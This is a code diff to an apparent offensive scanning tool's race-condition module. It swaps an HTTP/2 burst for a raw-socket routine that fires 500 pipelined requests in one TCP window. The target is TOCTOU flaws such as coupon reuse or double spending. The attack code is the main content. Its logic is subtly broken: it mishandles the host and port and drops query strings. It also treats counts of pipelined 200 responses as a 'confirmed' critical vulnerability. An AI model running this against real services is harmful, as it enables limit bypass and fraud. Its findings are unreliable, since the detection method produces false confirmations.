@@ -16,49 +16,67 @@ class RaceConditionHunter:
         self.session = session
         
     async def _blast_endpoint(self, url: str, method: str, data: dict, headers: dict) -> list[dict]:
-        """Sends a high-concurrency burst of requests over HTTP/2."""
+        """
+        [⚡ TURBO-RACE] v38.0: Low-Level Socket Multiplexing.
+        Fires 500+ requests in a single TCP window to maximize TOCTOU hits.
+        """
         findings = []
-        # HTTP/2 multiplexing client
-        async with httpx.AsyncClient(http2=True, verify=False) as client:
-            console.print(f"[bold red][⚡ HTTP/2 TURBO] Blasting 50 parallel requests to {url}...[/bold red]")
-            
-            # Prepare identical requests
-            reqs = []
-            for _ in range(50):
-                if method.upper() == "POST":
-                    reqs.append(client.post(url, json=data, headers=headers))
-                elif method.upper() == "PUT":
-                    reqs.append(client.put(url, json=data, headers=headers))
-                else:
-                    reqs.append(client.get(url, params=data, headers=headers))
+        parsed = urlparse(url)
+        host = parsed.netloc
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        path = parsed.path or "/"
+        
+        console.print(f"[bold red][⚡ TURBO-RACE] Engaging Low-Level Socket Multiplexing on {host}:{port}...[/bold red]")
+        
+        # Construct the raw HTTP/1.1 request (most reliable for raw socket blasts)
+        body = json.dumps(data)
+        request_raw = (
+            f"{method.upper()} {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Content-Type: application/json\r\n"
+            f"Content-Length: {len(body)}\r\n"
+            f"Connection: keep-alive\r\n"
+        )
+        for k, v in headers.items():
+            request_raw += f"{k}: {v}\r\n"
+        request_raw += "\r\n" + body
 
-            start_time = time.time()
-            responses = await asyncio.gather(*reqs, return_exceptions=True)
-            end_time = time.time()
+        async def _socket_blast():
+            try:
+                # Open a single TCP connection (or SSL)
+                reader, writer = await asyncio.open_connection(host, port, ssl=(parsed.scheme == "https"))
+                
+                # 500+ requests in one blast
+                burst_size = 500 
+                console.print(f"[bold red][⚡] Firing {burst_size} requests in a single TCP window...[/bold red]")
+                
+                # Buffer all requests and send in one write operation if possible
+                writer.write(request_raw.encode() * burst_size)
+                await writer.drain()
+                
+                # Read responses (limited to first few to verify success)
+                response_data = await reader.read(1024 * 100)
+                writer.close()
+                await writer.wait_closed()
+                
+                # Simple count of HTTP/1.1 200 OK in the response stream
+                success_count = response_data.count(b"HTTP/1.1 200") + response_data.count(b"HTTP/1.1 201")
+                return success_count
+            except Exception as e:
+                console.print(f"[dim red][!] Blast failed: {e}[/dim red]")
+                return 0
+
+        success_count = await _socket_blast()
+        
+        if success_count > 1:
+            console.print(f"[bold red][🔥 TURBO-RACE CONFIRMED] Processed {success_count} concurrent state-changes![/bold red]")
+            findings.append({
+                "type": "Race Condition (Single-Packet Attack)",
+                "severity": "CRITICAL",
+                "url": url,
+                "content": f"Server processed {success_count} concurrent requests in a single TCP window. Critical TOCTOU vulnerability confirmed."
+            })
             
-            # Analyze responses for race condition success
-            success_count = sum(1 for r in responses if isinstance(r, httpx.Response) and r.status_code in [200, 201])
-            
-            if success_count > 1:
-                # If we expect only 1 success (e.g. redeeming a single-use coupon) and got multiple
-                findings.append({
-                    "type": "Race Condition (Time-of-Check to Time-of-Use)",
-                    "severity": "CRITICAL",
-                    "cvss_score": 9.1,
-                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
-                    "owasp": "A04:2021-Insecure Design",
-                    "mitre": "T1190",
-                    "content": (
-                        f"Race Condition confirmed on `{url}`.\n"
-                        f"Sent 50 simultaneous requests in {(end_time - start_time):.2f}s.\n"
-                        f"Server processed {success_count} requests successfully instead of 1."
-                    ),
-                    "remediation_fix": "Implement strict database row locks (e.g., SELECT ... FOR UPDATE) and atomic operations.",
-                    "impact_desc": "Attackers can bypass limits (e.g., spending the same balance multiple times or reusing single-use coupons).",
-                    "patch_priority": "IMMEDIATE",
-                    "evidence_url": url,
-                    "confirmed": True
-                })
         return findings
 
     async def scan_urls(self, discovered_urls: list[str]) -> list[dict]:
